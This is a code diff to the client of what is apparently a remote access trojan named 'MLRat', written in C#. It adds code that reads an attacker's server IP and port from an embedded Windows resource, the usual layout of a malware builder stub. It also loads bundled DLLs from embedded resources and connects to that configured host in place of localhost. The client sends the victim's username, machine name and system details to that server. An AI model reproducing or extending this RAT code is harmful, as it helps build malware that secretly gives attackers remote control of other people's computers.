@@ -9,6 +9,8 @@ using System.Reflection;
 using System.Threading;
 using System.Windows.Forms;
 using System.Security.Cryptography;
+using System.Resources;
+using System.Runtime.InteropServices;
 
 namespace MLRatClient
 {
@@ -18,9 +20,27 @@ namespace MLRatClient
         private static Dictionary<Guid, MLClientPlugin> LoadedPlugins = new Dictionary<Guid, MLClientPlugin>();
         private static Dictionary<Guid, Stream> PluginUpdates = new Dictionary<Guid, Stream>();
         private static string PluginBaseLocation;
+        private static string IP = "";
+        private static int Port = 0;
+
         [STAThread]
         static void Main(string[] args)
         {
+            AppDomain.CurrentDomain.AssemblyResolve +=
+            (sender, arg) =>
+            {
+                string resourceName = "MLRatClient." + new AssemblyName(arg.Name).Name + ".dll";
+
+                using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
+                {
+                    Byte[] assemblyData = new Byte[stream.Length];
+
+                    stream.Read(assemblyData, 0, assemblyData.Length);
+
+                    return Assembly.Load(assemblyData);
+
+                }
+            };
             Application.EnableVisualStyles();
             string _ratBase = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                 "MLRat");
@@ -35,8 +55,36 @@ namespace MLRatClient
             }
 
             Console.WriteLine("MLRat started");
+            ReadSettings();
+            Console.WriteLine("IP: {0}", IP);
+            Console.WriteLine("Port: {0}", Port);
             Connect();
             Application.Run();
+        }
+
+        static void ReadSettings()
+        {
+            try
+            {
+                IntPtr module = GetModuleHandle(null);
+                IntPtr loc = FindResource(module, "Settings", "RT_RCDATA");
+                IntPtr resourceAddr = LoadResource(module, loc);
+                uint size = SizeofResource(module, loc);
+                byte[] resource = new byte[size];
+                Marshal.Copy(resourceAddr, resource, 0, resource.Length);
+                using (MemoryStream ms = new MemoryStream(resource))
+                using (BinaryReader br = new BinaryReader(ms))
+                {
+                    Port = br.ReadInt32();
+                    IP = br.ReadString();
+                }
+                Console.WriteLine("Loaded from settings");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.ToString());
+                Environment.Exit(0);
+            }
         }
         static void Connect()
         {
@@ -46,7 +94,7 @@ namespace MLRatClient
             networkClient.OnDataRetrieved += networkClient_OnDataRetrieved;
             networkClient.OnDisconnect += networkClient_OnDisconnect;
             networkClient.OnConnect += NetworkClient_OnConnect;
-            networkClient.ConnectAsync("127.0.0.1", 12345);
+            networkClient.ConnectAsync(IP, Port);
         }
 
         private static void NetworkClient_OnConnect(eSock.Client sender, bool success)
@@ -323,7 +371,6 @@ namespace MLRatClient
                         networkClient.Send(Guid.Empty, (byte)NetworkPacket.UpdateSetting, "Username", string.Format("{0}/{1}", Environment.UserName, Environment.MachineName));
                         networkClient.Send(Guid.Empty, (byte)NetworkPacket.UpdateSetting, "OS", Environment.OSVersion.ToString());
                         networkClient.Send(Guid.Empty, (byte)NetworkPacket.UpdateSetting, "Cores", Environment.ProcessorCount.ToString());
-                        networkClient.Send(Guid.Empty, (byte)NetworkPacket.UpdateSetting, "Path", Assembly.GetExecutingAssembly().Location);
                         networkClient.Send(Guid.Empty, (byte)NetworkPacket.BasicSettingsUpdated);
                     }
 
@@ -357,8 +404,21 @@ namespace MLRatClient
             }
         }
 
+
         #endregion
 
-        
+        #region " WinApi "
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetModuleHandle(string module);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr FindResource(IntPtr hModule, string lpName, string lpType);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern uint SizeofResource(IntPtr hModule, IntPtr hResInfo);
+
+        #endregion
+
     }
 }
